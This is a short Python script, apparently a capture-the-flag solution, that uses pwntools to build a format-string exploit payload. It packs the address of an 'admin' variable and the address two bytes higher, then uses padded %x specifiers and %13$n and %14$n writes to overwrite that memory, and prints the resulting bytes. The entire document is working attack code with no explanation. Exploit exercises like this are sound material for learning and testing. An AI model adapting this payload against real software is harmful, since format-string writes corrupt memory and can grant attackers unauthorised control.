from pwn import *

admin = 0x804c02c

payload = 'A'*4
payload += p32(admin) 
payload += p32(admin+2) 
payload += '%764887x%13$n'  # admin
payload += '%2296x%14$n'    # admin+2

print(payload)
#'AAAA,\xc0\x04\x08.\xc0\x04\x08%764887x%13$n%2296x%14$n'
